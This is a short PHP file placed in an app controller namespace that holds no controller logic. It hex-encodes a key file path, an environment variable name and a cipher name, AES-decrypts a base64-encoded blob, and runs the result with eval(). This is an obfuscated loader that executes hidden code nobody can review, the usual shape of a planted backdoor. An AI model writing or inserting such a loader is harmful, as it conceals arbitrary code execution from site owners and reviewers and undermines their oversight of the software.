<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('eALZCcgggPjzbEYE900wsw==');

$c=base64_decode(

'ywDtTHYdu4TOyYZRWN2Ayykti/kXEgPx0SXlA+hbmHAIK8skNo7EIkKQrReZTf/jt1T5KVa4ozmd' .
'akGfadp4E8hyBpilq588EVKlpV8Kzew8N/5eHZt9fmgoUmt4+ZI3zTx/WFgLzmsBzdLQBvXGKvQj' .
'31l60GwJcLPkbLaE5FjoTrmfyYMPYGtTQNbt3/NFbmMLCOuDDiSR2Y4v3V4MIN/U/rLJ5HkRRB62' .
'ajXdYEnzXlnIbYBLqg5j7km6EYRs'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

